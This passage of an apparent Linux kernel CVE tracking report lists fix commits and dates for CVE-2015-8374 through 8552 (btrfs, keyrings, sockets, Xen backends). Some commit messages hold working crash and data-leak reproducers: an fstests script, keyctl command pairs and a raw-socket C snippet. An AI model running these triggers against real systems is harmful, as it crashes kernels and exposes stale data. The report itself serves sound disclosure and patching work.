          the bytes in the range [1000, 2000[ bytes from its own file, but
          that might be ok if his/her intention was reading stale data from
          user A that was never supposed to be public.
    
    Note that this contrasts with the case where we truncate a file from 2000
    bytes to 1000 bytes and then truncate it back from 1000 to 2000 bytes. In
    this case reading any byte from the range [1000, 2000[ will return a value
    of 0x00, instead of the original data.
    
    This problem exists since the clone ioctl was added and happens both with
    and without my recent data loss and file corruption fixes for the clone
    ioctl (patch "Btrfs: fix file corruption and data loss after cloning
    inline extents").
    
    So fix this by truncating the compressed inline extents as we do for the
    non-compressed case, which involves decompressing, if the data isn't already
    in the page cache, compressing the truncated version of the extent, writing
    the compressed content into the inline extent and then truncate it.
    
    The following test case for fstests reproduces the problem. In order for
    the test to pass both this fix and my previous fix for the clone ioctl
    that forbids cloning a smaller inline extent into a larger one,
    which is titled "Btrfs: fix file corruption and data loss after cloning
    inline extents", are needed. Without that other fix the test fails in a
    different way that does not leak the truncated data, instead part of
    destination file gets replaced with zeroes (because the destination file
    has a larger inline extent than the source).
    
      seq=`basename $0`
      seqres=$RESULT_DIR/$seq
      echo "QA output created by $seq"
      tmp=/tmp/$$
      status=1	# failure is the default!
      trap "_cleanup; exit \$status" 0 1 2 3 15
    
      _cleanup()
      {
          rm -f $tmp.*
      }
    
      # get standard environment, filters and checks
      . ./common/rc
      . ./common/filter
    
      # real QA test starts here
      _need_to_be_root
      _supported_fs btrfs
      _supported_os Linux
      _require_scratch
      _require_cloner
    
      rm -f $seqres.full
    
      _scratch_mkfs >>$seqres.full 2>&1
      _scratch_mount "-o compress"
    
      # Create our test files. File foo is going to be the source of a clone operation
      # and consists of a single inline extent with an uncompressed size of 512 bytes,
      # while file bar consists of a single inline extent with an uncompressed size of
      # 256 bytes. For our test's purpose, it's important that file bar has an inline
      # extent with a size smaller than foo's inline extent.
      $XFS_IO_PROG -f -c "pwrite -S 0xa1 0 128"   \
              -c "pwrite -S 0x2a 128 384" \
              $SCRATCH_MNT/foo | _filter_xfs_io
      $XFS_IO_PROG -f -c "pwrite -S 0xbb 0 256" $SCRATCH_MNT/bar | _filter_xfs_io
    
      # Now durably persist all metadata and data. We do this to make sure that we get
      # on disk an inline extent with a size of 512 bytes for file foo.
      sync
    
      # Now truncate our file foo to a smaller size. Because it consists of a
      # compressed and inline extent, btrfs did not shrink the inline extent to the
      # new size (if the extent was not compressed, btrfs would shrink it to 128
      # bytes), it only updates the inode's i_size to 128 bytes.
      $XFS_IO_PROG -c "truncate 128" $SCRATCH_MNT/foo
    
      # Now clone foo's inline extent into bar.
      # This clone operation should fail with errno EOPNOTSUPP because the source
      # file consists only of an inline extent and the file's size is smaller than
      # the inline extent of the destination (128 bytes < 256 bytes). However the
      # clone ioctl was not prepared to deal with a file that has a size smaller
      # than the size of its inline extent (something that happens only for compressed
      # inline extents), resulting in copying the full inline extent from the source
      # file into the destination file.
      #
      # Note that btrfs' clone operation for inline extents consists of removing the
      # inline extent from the destination inode and copy the inline extent from the
      # source inode into the destination inode, meaning that if the destination
      # inode's inline extent is larger (N bytes) than the source inode's inline
      # extent (M bytes), some bytes (N - M bytes) will be lost from the destination
      # file. Btrfs could copy the source inline extent's data into the destination's
      # inline extent so that we would not lose any data, but that's currently not
      # done due to the complexity that would be needed to deal with such cases
      # (specially when one or both extents are compressed), returning EOPNOTSUPP, as
      # it's normally not a very common case to clone very small files (only case
      # where we get inline extents) and copying inline extents does not save any
      # space (unlike for normal, non-inlined extents).
      $CLONER_PROG -s 0 -d 0 -l 0 $SCRATCH_MNT/foo $SCRATCH_MNT/bar
    
      # Now because the above clone operation used to succeed, and due to foo's inline
      # extent not being shinked by the truncate operation, our file bar got the whole
      # inline extent copied from foo, making us lose the last 128 bytes from bar
      # which got replaced by the bytes in range [128, 256[ from foo before foo was
      # truncated - in other words, data loss from bar and being able to read old and
      # stale data from foo that should not be possible to read anymore through normal
      # filesystem operations. Contrast with the case where we truncate a file from a
      # size N to a smaller size M, truncate it back to size N and then read the range
      # [M, N[, we should always get the value 0x00 for all the bytes in that range.
    
      # We expected the clone operation to fail with errno EOPNOTSUPP and therefore
      # not modify our file's bar data/metadata. So its content should be 256 bytes
      # long with all bytes having the value 0xbb.
      #
      # Without the btrfs bug fix, the clone operation succeeded and resulted in
      # leaking truncated data from foo, the bytes that belonged to its range
      # [128, 256[, and losing data from bar in that same range. So reading the
      # file gave us the following content:
      #
      # 0000000 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1
      # *
      # 0000200 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a
      # *
      # 0000400
      echo "File bar's content after the clone operation:"
      od -t x1 $SCRATCH_MNT/bar
    
      # Also because the foo's inline extent was not shrunk by the truncate
      # operation, btrfs' fsck, which is run by the fstests framework everytime a
      # test completes, failed reporting the following error:
      #
      #  root 5 inode 257 errors 400, nbytes wrong
    
      status=0
      exit
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Filipe Manana <fdmanana@suse.com>

 fs/btrfs/inode.c |   82 ++++++++++++++++++++++++++++++++++++++++++++----------
 1 file changed, 68 insertions(+), 14 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-12-28
CVE: CVE-2015-8374
Break Date: 2008-09-25
Break Commit: f2eb0a241f0e5c135d93243b0236cb1f14c305e0
Break Tag: 2.6
Linus Fix Date: 2015-10-16
Linus Commit: 0305cd5f7fca85dae392b9ba85b116896eb7c1c7
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8539:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 096fe9eaea40a17e125569f9e657e34cdb6d73bd
Author: David Howells <dhowells@redhat.com>
Date:   Tue Nov 24 21:36:31 2015 +0000

    KEYS: Fix handling of stored error in a negatively instantiated user key
    
    If a user key gets negatively instantiated, an error code is cached in the
    payload area.  A negatively instantiated key may be then be positively
    instantiated by updating it with valid data.  However, the ->update key
    type method must be aware that the error code may be there.
    
    The following may be used to trigger the bug in the user key type:
    
        keyctl request2 user user "" @u
        keyctl add user user "a" @u
    
    which manifests itself as:
    
    	BUG: unable to handle kernel paging request at 00000000ffffff8a
    	IP: [<ffffffff810a376f>] __call_rcu.constprop.76+0x1f/0x280 kernel/rcu/tree.c:3046
    	PGD 7cc30067 PUD 0
    	Oops: 0002 [#1] SMP
    	Modules linked in:
    	CPU: 3 PID: 2644 Comm: a.out Not tainted 4.3.0+ #49
    	Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011
    	task: ffff88003ddea700 ti: ffff88003dd88000 task.ti: ffff88003dd88000
    	RIP: 0010:[<ffffffff810a376f>]  [<ffffffff810a376f>] __call_rcu.constprop.76+0x1f/0x280
    	 [<ffffffff810a376f>] __call_rcu.constprop.76+0x1f/0x280 kernel/rcu/tree.c:3046
    	RSP: 0018:ffff88003dd8bdb0  EFLAGS: 00010246
    	RAX: 00000000ffffff82 RBX: 0000000000000000 RCX: 0000000000000001
    	RDX: ffffffff81e3fe40 RSI: 0000000000000000 RDI: 00000000ffffff82
    	RBP: ffff88003dd8bde0 R08: ffff88007d2d2da0 R09: 0000000000000000
    	R10: 0000000000000000 R11: ffff88003e8073c0 R12: 00000000ffffff82
    	R13: ffff88003dd8be68 R14: ffff88007d027600 R15: ffff88003ddea700
    	FS:  0000000000b92880(0063) GS:ffff88007fd00000(0000) knlGS:0000000000000000
    	CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b
    	CR2: 00000000ffffff8a CR3: 000000007cc5f000 CR4: 00000000000006e0
    	Stack:
    	 ffff88003dd8bdf0 ffffffff81160a8a 0000000000000000 00000000ffffff82
    	 ffff88003dd8be68 ffff88007d027600 ffff88003dd8bdf0 ffffffff810a39e5
    	 ffff88003dd8be20 ffffffff812a31ab ffff88007d027600 ffff88007d027620
    	Call Trace:
    	 [<ffffffff810a39e5>] kfree_call_rcu+0x15/0x20 kernel/rcu/tree.c:3136
    	 [<ffffffff812a31ab>] user_update+0x8b/0xb0 security/keys/user_defined.c:129
    	 [<     inline     >] __key_update security/keys/key.c:730
    	 [<ffffffff8129e5c1>] key_create_or_update+0x291/0x440 security/keys/key.c:908
    	 [<     inline     >] SYSC_add_key security/keys/keyctl.c:125
    	 [<ffffffff8129fc21>] SyS_add_key+0x101/0x1e0 security/keys/keyctl.c:60
    	 [<ffffffff8185f617>] entry_SYSCALL_64_fastpath+0x12/0x6a arch/x86/entry/entry_64.S:185
    
    Note the error code (-ENOKEY) in EDX.
    
    A similar bug can be tripped by:
    
        keyctl request2 trusted user "" @u
        keyctl add trusted user "a" @u
    
    This should also affect encrypted keys - but that has to be correctly
    parameterised or it will fail with EINVAL before getting to the bit that
    will crashes.
    
    Reported-by: Dmitry Vyukov <dvyukov@google.com>
    Signed-off-by: David Howells <dhowells@redhat.com>
    Acked-by: Mimi Zohar <zohar@linux.vnet.ibm.com>
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 security/keys/encrypted-keys/encrypted.c |    2 ++
 security/keys/trusted.c                  |    5 ++++-
 security/keys/user_defined.c             |    5 ++++-
 3 files changed, 10 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-02-07
CVE: CVE-2015-8539
Break Date: 2015-10-21
Break Commit: 146aa8b1453bd8f1ff2304ffb71b4ee0eb9acdcc
Break Tag: 4.5
Linus Fix Date: 2015-11-25
Linus Commit: 096fe9eaea40a17e125569f9e657e34cdb6d73bd
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8543:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.59.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 79462ad02e861803b3840cc782248c7359451cd9
Author: Hannes Frederic Sowa <hannes@stressinduktion.org>
Date:   Mon Dec 14 22:03:39 2015 +0100

    net: add validation for the socket syscall protocol argument
    
     reported that one could simply crash the kernel as root by
    using a simple program:
    
    	int socket_fd;
    	struct sockaddr_in addr;
    	addr.sin_port = 0;
    	addr.sin_addr.s_addr = INADDR_ANY;
    	addr.sin_family = 10;
    
    	socket_fd = socket(10,3,0x40000000);
    	connect(socket_fd , &addr,16);
    
    AF_INET, AF_INET6 sockets actually only support 8-bit protocol
    identifiers. inet_sock's skc_protocol field thus is sized accordingly,
    thus larger protocol identifiers simply cut off the higher bits and
    store a zero in the protocol fields.
    
    This could lead to e.g. NULL function pointer because as a result of
    the cut off inet_num is zero and we call down to inet_autobind, which
    is NULL for raw sockets.
    
    kernel: Call Trace:
    kernel:  [<ffffffff816db90e>] ? inet_autobind+0x2e/0x70
    kernel:  [<ffffffff816db9a4>] inet_dgram_connect+0x54/0x80
    kernel:  [<ffffffff81645069>] SYSC_connect+0xd9/0x110
    kernel:  [<ffffffff810ac51b>] ? ptrace_notify+0x5b/0x80
    kernel:  [<ffffffff810236d8>] ? syscall_trace_enter_phase2+0x108/0x200
    kernel:  [<ffffffff81645e0e>] SyS_connect+0xe/0x10
    kernel:  [<ffffffff81779515>] tracesys_phase2+0x84/0x89
    
    I found no particular commit which introduced this problem.
    
    CVE: CVE-2015-8543
    Cc: Cong Wang <cwang@twopensource.com>
    Reported-by:  <guoyonggang@360.cn>
    Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/sock.h     |    1 +
 net/ax25/af_ax25.c     |    3 +++
 net/decnet/af_decnet.c |    3 +++
 net/ipv4/af_inet.c     |    3 +++
 net/ipv6/af_inet6.c    |    3 +++
 net/irda/af_irda.c     |    3 +++
 6 files changed, 16 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-12-28
CVE: CVE-2015-8543
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-14
Linus Commit: 79462ad02e861803b3840cc782248c7359451cd9
Linus Tag: 4.4
Stable Date: 2016-01-22
Stable Commit: 49c9b76db37ecfbac70b0841438fbe9d446ceb52
Stable Tag: 3.14.59

CVE-2015-8550:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 0f589967a73f1f30ab4ac4dd9ce0bb399b4d6357
Author: David Vrabel <david.vrabel@citrix.com>
Date:   Fri Oct 30 15:16:01 2015 +0000

    xen-netback: don't use last request to determine minimum Tx credit
    
    The last from guest transmitted request gives no indication about the
    minimum amount of credit that the guest might need to send a packet
    since the last packet might have been a small one.
    
    Instead allow for the worst case 128 KiB packet.
    
    This is part of XSA155.
    
    CC: stable@vger.kernel.org
    Reviewed-by: Wei Liu <wei.liu2@citrix.com>
    Signed-off-by: David Vrabel <david.vrabel@citrix.com>
    Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

 drivers/net/xen-netback/netback.c |    4 +---
 1 file changed, 1 insertion(+), 3 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-14
CVE: CVE-2015-8550
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-18
Linus Commit: 0f589967a73f1f30ab4ac4dd9ce0bb399b4d6357
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8550:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 1f13d75ccb806260079e0679d55d9253e370ec8a
Author: Roger Pau Monn <roger.pau@citrix.com>
Date:   Tue Nov 3 16:34:09 2015 +0000

    xen-blkback: only read request operation from shared ring once
    
    A compiler may load a switch statement value multiple times, which could
    be bad when the value is in memory shared with the frontend.
    
    When converting a non-native request to a native one, ensure that
    src->operation is only loaded once by using READ_ONCE().
    
    This is part of XSA155.
    
    CC: stable@vger.kernel.org
    Signed-off-by: Roger Pau Monn <roger.pau@citrix.com>
    Signed-off-by: David Vrabel <david.vrabel@citrix.com>
    Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

 drivers/block/xen-blkback/common.h |    8 ++++----
 1 file changed, 4 insertions(+), 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-14
CVE: CVE-2015-8550
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-18
Linus Commit: 1f13d75ccb806260079e0679d55d9253e370ec8a
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8550:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 454d5d882c7e412b840e3c99010fe81a9862f6fb
Author: David Vrabel <david.vrabel@citrix.com>
Date:   Fri Oct 30 14:58:08 2015 +0000

    xen: Add RING_COPY_REQUEST()
    
    Using RING_GET_REQUEST() on a shared ring is easy to use incorrectly
    (i.e., by not considering that the other end may alter the data in the
    shared ring while it is being inspected).  Safe usage of a request
    generally requires taking a local copy.
    
    Provide a RING_COPY_REQUEST() macro to use instead of
    RING_GET_REQUEST() and an open-coded memcpy().  This takes care of
    ensuring that the copy is done correctly regardless of any possible
    compiler optimizations.
    
    Use a volatile source to prevent the compiler from reordering or
    omitting the copy.
    
    This is part of XSA155.
    
    CC: stable@vger.kernel.org
    Signed-off-by: David Vrabel <david.vrabel@citrix.com>
    Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

 include/xen/interface/io/ring.h |   14 ++++++++++++++
 1 file changed, 14 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-14
CVE: CVE-2015-8550
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-18
Linus Commit: 454d5d882c7e412b840e3c99010fe81a9862f6fb
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8550:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 68a33bfd8403e4e22847165d149823a2e0e67c9c
Author: David Vrabel <david.vrabel@citrix.com>
Date:   Fri Oct 30 15:17:06 2015 +0000

    xen-netback: use RING_COPY_REQUEST() throughout
    
    Instead of open-coding memcpy()s and directly accessing Tx and Rx
    requests, use the new RING_COPY_REQUEST() that ensures the local copy
    is correct.
    
    This is more than is strictly necessary for guest Rx requests since
    only the id and gref fields are used and it is harmless if the
    frontend modifies these.
    
    This is part of XSA155.
    
    CC: stable@vger.kernel.org
    Reviewed-by: Wei Liu <wei.liu2@citrix.com>
    Signed-off-by: David Vrabel <david.vrabel@citrix.com>
    Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

 drivers/net/xen-netback/netback.c |   30 ++++++++++++++----------------
 1 file changed, 14 insertions(+), 16 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-14
CVE: CVE-2015-8550
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-18
Linus Commit: 68a33bfd8403e4e22847165d149823a2e0e67c9c
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8550:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 8135cf8b092723dbfcc611fe6fdcb3a36c9951c5
Author: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>
Date:   Mon Nov 16 12:40:48 2015 -0500

    xen/pciback: Save xen_pci_op commands before processing it
    
    Double fetch vulnerabilities that happen when a variable is
    fetched twice from shared memory but a security check is only
    performed the first time.
    
    The xen_pcibk_do_op function performs a switch statements on the op->cmd
    value which is stored in shared memory. Interestingly this can result
    in a double fetch vulnerability depending on the performed compiler
    optimization.
    
    This patch fixes it by saving the xen_pci_op command before
    processing it. We also use 'barrier' to make sure that the
    compiler does not perform any optimization.
    
    This is part of XSA155.
    
    CC: stable@vger.kernel.org
    Reviewed-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>
    Signed-off-by: Jan Beulich <JBeulich@suse.com>
    Signed-off-by: David Vrabel <david.vrabel@citrix.com>
    Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

 drivers/xen/xen-pciback/pciback.h     |    1 +
 drivers/xen/xen-pciback/pciback_ops.c |   15 ++++++++++++++-
 2 files changed, 15 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-14
CVE: CVE-2015-8550
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-18
Linus Commit: 8135cf8b092723dbfcc611fe6fdcb3a36c9951c5
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8550:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 18779149101c0dd43ded43669ae2a92d21b6f9cb
Author: Roger Pau Monn <roger.pau@citrix.com>
Date:   Tue Nov 3 16:40:43 2015 +0000

    xen-blkback: read from indirect descriptors only once
    
    Since indirect descriptors are in memory shared with the frontend, the
    frontend could alter the first_sect and last_sect values after they have
    been validated but before they are recorded in the request.  This may
    result in I/O requests that overflow the foreign page, possibly
    overwriting local pages when the I/O request is executed.
    
    When parsing indirect descriptors, only read first_sect and last_sect
    once.
    
    This is part of XSA155.
    
    CC: stable@vger.kernel.org
    Signed-off-by: Roger Pau Monn <roger.pau@citrix.com>
    Signed-off-by: David Vrabel <david.vrabel@citrix.com>
    Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

 drivers/block/xen-blkback/blkback.c |   15 ++++++++++-----
 1 file changed, 10 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-14
CVE: CVE-2015-8550
Break Date: 2013-04-18
Break Commit: 402b27f9f2c22309d5bb285628765bc27b82fcf5
Break Tag: 3.11
Linus Fix Date: 2015-12-18
Linus Commit: 18779149101c0dd43ded43669ae2a92d21b6f9cb
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8550:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit be69746ec12f35b484707da505c6c76ff06f97dc
Author: David Vrabel <david.vrabel@citrix.com>
Date:   Mon Nov 16 18:02:32 2015 +0000

    xen-scsiback: safely copy requests
    
    The copy of the ring request was lacking a following barrier(),
    potentially allowing the compiler to optimize the copy away.
    
    Use RING_COPY_REQUEST() to ensure the request is copied to local
    memory.
    
    This is part of XSA155.
    
    CC: stable@vger.kernel.org
    Reviewed-by: Juergen Gross <jgross@suse.com>
    Signed-off-by: David Vrabel <david.vrabel@citrix.com>
    Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

 drivers/xen/xen-scsiback.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-14
CVE: CVE-2015-8550
Break Date: 2014-09-23
Break Commit: d9d660f6e562a47b4065eeb7e538910b0471b988
Break Tag: 3.18
Linus Fix Date: 2015-12-18
Linus Commit: be69746ec12f35b484707da505c6c76ff06f97dc
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8551:
CVE-2015-8552:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 408fb0e5aa7fda0059db282ff58c3b2a4278baa0
Author: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>
Date:   Mon Nov 2 18:13:27 2015 -0500

    xen/pciback: Don't allow MSI-X ops if PCI_COMMAND_MEMORY is not set.
    
    commit f598282f51 ("PCI: Fix the NIU MSI-X problem in a better way")
    teaches us that dealing with MSI-X can be troublesome.
    
    Further checks in the MSI-X architecture shows that if the
    PCI_COMMAND_MEMORY bit is turned of in the PCI_COMMAND we
    may not be able to access the BAR (since they are memory regions).
    
    Since the MSI-X tables are located in there.. that can lead
    to us causing PCIe errors. Inhibit us performing any
    operation on the MSI-X unless the MEMORY bit is set.
    
    Note that Xen hypervisor with:
    "x86/MSI-X: access MSI-X table only after having enabled MSI-X"
    will return:
    xen_pciback: 0000:0a:00.1: error -6 enabling MSI-X for guest 3!
    
    When the generic MSI code tries to setup the PIRQ without
    MEMORY bit set. Which means with later versions of Xen
    (4.6) this patch is not neccessary.
    
    This is part of XSA-157
    
    CC: stable@vger.kernel.org
    Reviewed-by: Jan Beulich <jbeulich@suse.com>
    Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

 drivers/xen/xen-pciback/pciback_ops.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-13
CVE: CVE-2015-8551
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-18
Linus Commit: 408fb0e5aa7fda0059db282ff58c3b2a4278baa0
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8551:
CVE-2015-8552:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 56441f3c8e5bd45aab10dd9f8c505dd4bec03b0d
Author: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>
Date:   Fri Apr 3 11:08:22 2015 -0400

    xen/pciback: Return error on XEN_PCI_OP_enable_msi when device has MSI or MSI-X enabled
    
    The guest sequence of:
    
     a) XEN_PCI_OP_enable_msi
     b) XEN_PCI_OP_enable_msi
     c) XEN_PCI_OP_disable_msi
    
    results in hitting an BUG_ON condition in the msi.c code.
    
    The MSI code uses an dev->msi_list to which it adds MSI entries.
    Under the above conditions an BUG_ON() can be hit. The device
    passed in the guest MUST have MSI capability.
    
    The a) adds the entry to the dev->msi_list and sets msi_enabled.
    The b) adds a second entry but adding in to SysFS fails (duplicate entry)
    and deletes all of the entries from msi_list and returns (with msi_enabled
    is still set).  c) pci_disable_msi passes the msi_enabled checks and hits:
    
    BUG_ON(list_empty(dev_to_msi_list(&dev->dev)));
    
    and blows up.
    
    The patch adds a simple check in the XEN_PCI_OP_enable_msi to guard
    against that. The check for msix_enabled is not stricly neccessary.
    
    This is part of XSA-157.
    
    CC: stable@vger.kernel.org
    Reviewed-by: David Vrabel <david.vrabel@citrix.com>
    Reviewed-by: Jan Beulich <jbeulich@suse.com>
    Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

 drivers/xen/xen-pciback/pciback_ops.c |    7 ++++++-
 1 file changed, 6 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-13
CVE: CVE-2015-8551
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-18
Linus Commit: 56441f3c8e5bd45aab10dd9f8c505dd4bec03b0d
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8551:
CVE-2015-8552:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 5e0ce1455c09dd61d029b8ad45d82e1ac0b6c4c9
Author: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>
Date:   Mon Nov 2 18:07:44 2015 -0500

    xen/pciback: Return error on XEN_PCI_OP_enable_msix when device has MSI or MSI-X enabled
    
    The guest sequence of:
    
      a) XEN_PCI_OP_enable_msix
      b) XEN_PCI_OP_enable_msix
    
    results in hitting an NULL pointer due to using freed pointers.
    
    The device passed in the guest MUST have MSI-X capability.
    
    The a) constructs and SysFS representation of MSI and MSI groups.
    The b) adds a second set of them but adding in to SysFS fails (duplicate entry).
    'populate_msi_sysfs' frees the newly allocated msi_irq_groups (note that
    in a) pdev->msi_irq_groups is still set) and also free's ALL of the
    MSI-X entries of the device (the ones allocated in step a) and b)).
    
    The unwind code: 'free_msi_irqs' deletes all the entries and tries to
    delete the pdev->msi_irq_groups (which hasn't been set to NULL).
    However the pointers in the SysFS are already freed and we hit an
    NULL pointer further on when 'strlen' is attempted on a freed pointer.
    
    The patch adds a simple check in the XEN_PCI_OP_enable_msix to guard
    against that. The check for msi_enabled is not stricly neccessary.
    
    This is part of XSA-157
    
    CC: stable@vger.kernel.org
    Reviewed-by: David Vrabel <david.vrabel@citrix.com>
    Reviewed-by: Jan Beulich <jbeulich@suse.com>
    Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

 drivers/xen/xen-pciback/pciback_ops.c |    7 +++++++
 1 file changed, 7 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-13
CVE: CVE-2015-8551
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-18
Linus Commit: 5e0ce1455c09dd61d029b8ad45d82e1ac0b6c4c9
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8551:
CVE-2015-8552:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7cfb905b9638982862f0331b36ccaaca5d383b49
Author: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>
Date:   Wed Apr 1 10:49:47 2015 -0400

    xen/pciback: For XEN_PCI_OP_disable_msi[|x] only disable if device has MSI(X) enabled.
    
    Otherwise just continue on, returning the same values as
    previously (return of 0, and op->result has the PIRQ value).
    
    This does not change the behavior of XEN_PCI_OP_disable_msi[|x].
    
    The pci_disable_msi or pci_disable_msix have the checks for
    msi_enabled or msix_enabled so they will error out immediately.
    
    However the guest can still call these operations and cause
    us to disable the 'ack_intr'. That means the backend IRQ handler
    for the legacy interrupt will not respond to interrupts anymore.
    
    This will lead to (if the device is causing an interrupt storm)
    for the Linux generic code to disable the interrupt line.
    
    Naturally this will only happen if the device in question
    is plugged in on the motherboard on shared level interrupt GSI.
    
    This is part of XSA-157
    
    CC: stable@vger.kernel.org
    Reviewed-by: David Vrabel <david.vrabel@citrix.com>
    Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

 drivers/xen/xen-pciback/pciback_ops.c |   33 ++++++++++++++++++++-------------
 1 file changed, 20 insertions(+), 13 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-13
CVE: CVE-2015-8551
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-18
Linus Commit: 7cfb905b9638982862f0331b36ccaaca5d383b49
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8551:
CVE-2015-8552:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
